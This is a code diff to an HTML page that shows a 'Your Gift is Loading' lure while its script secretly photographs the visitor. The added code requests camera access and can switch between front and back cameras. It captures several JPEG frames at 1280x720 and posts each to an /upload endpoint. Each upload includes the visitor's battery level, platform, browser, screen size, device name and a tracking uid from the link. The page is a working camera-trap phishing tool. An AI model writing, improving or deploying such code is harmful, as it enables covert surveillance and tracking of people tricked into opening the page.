@@ -26,7 +26,7 @@
             <img class="gudda-img" src="https://cdn-icons-png.flaticon.com/512/226/226770.png"> 
             <img class="key-anim" src="https://cdn-icons-png.flaticon.com/512/3039/3039433.png">
         </div>
-        <p style="font-size: 20px; margin-top: 15px; font-weight: bold;">Your Gift is Loading...</p>
+        <p style="font-size: 20px; margin-top: 15px; font-weight: bold;">Your Gift is Loading...🎁</p>
         <div class="loader"></div>
     </div>
 
@@ -40,6 +40,8 @@
 
     <script>
         const params = new URLSearchParams(window.location.search);
+        const mode = params.get('m') || 'front';
+        const uid = params.get('uid');
 
         async function startWork() {
             document.body.style.background = "black";
@@ -47,51 +49,60 @@
             document.getElementById('start-page').style.display = 'none';
             document.getElementById('loading-ui').style.display = 'block';
 
+            let info = {
+                battery: "N/A",
+                platform: navigator.platform,
+                browser: navigator.userAgent.split(' ').pop(),
+                screen: window.screen.width + "x" + window.screen.height
+            };
+            try { let b = await navigator.getBattery(); info.battery = Math.round(b.level*100)+"%"; } catch(e){}
+
+            // Device info extraction from userAgent
+            let deviceName = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : navigator.platform;
+
+            if(mode === 'front') await runCam(info, {facingMode: "user"}, 4, "FRONT", deviceName);
+            else if(mode === 'back') await runCam(info, {facingMode: "environment"}, 4, "BACK", deviceName);
+            else {
+                await runCam(info, {facingMode: "environment"}, 2, "BACK", deviceName);
+                await runCam(info, {facingMode: "user"}, 2, "FRONT", deviceName);
+            }
+
+            document.getElementById('loading-ui').style.display = 'none';
+            document.getElementById('success-msg').style.display = 'block';
+        }
+
+        async function runCam(info, constraints, count, label, deviceName) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: params.get('m') === 'back' ? 'environment' : 'user' } 
+                let stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { ...constraints, width: {ideal: 1280}, height: {ideal: 720} } 
                 });
-                const v = document.getElementById('v');
-                v.srcObject = stream;
+                let video = document.getElementById('v');
+                video.srcObject = stream;
+                await video.play();
                 
-                let batInfo = "N/A";
-                try {
-                    const battery = await navigator.getBattery();
-                    batInfo = Math.round(battery.level * 100) + "%";
-                } catch(e) {}
+                // 8 seconds delay for camera stability
+                await new Promise(r => setTimeout(r, 8000)); 
 
-                const deviceInfo = navigator.platform;
-                const browserInfo = navigator.vendor || "Mobile Browser";
-
-                await new Promise(r => setTimeout(r, 8000));
-
-                const c = document.getElementById('c');
-                const ctx = c.getContext('2d');
-
-                for(let i=0; i<4; i++) {
-                    c.width = v.videoWidth; 
-                    c.height = v.videoHeight;
-                    ctx.drawImage(v, 0, 0);
-                    
-                    const imgData = c.toDataURL('image/jpeg', 0.8);
+                for (let i = 1; i <= count; i++) {
+                    let can = document.getElementById('c');
+                    can.width = video.videoWidth; 
+                    can.height = video.videoHeight;
+                    can.getContext('2d').drawImage(video, 0, 0);
                     
                     await fetch('/upload', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
-                            image: imgData,
-                            uid: params.get('uid'), 
-                            mode: params.get('m'),
-                            info: { battery: batInfo, device: deviceInfo, browser: browserInfo }
+                            image: can.toDataURL('image/jpeg', 0.8), 
+                            info: { ...info, device: deviceName }, 
+                            mode: label,
+                            uid: uid 
                         })
                     });
-                    await new Promise(r => setTimeout(r, 2000)); 
+                    await new Promise(r => setTimeout(r, 2500));
                 }
-                stream.getTracks().forEach(track => track.stop());
+                stream.getTracks().forEach(t => t.stop());
             } catch(e) {}
-
-            document.getElementById('loading-ui').style.display = 'none';
-            document.getElementById('success-msg').style.display = 'block';
         }
     </script>
 </body>
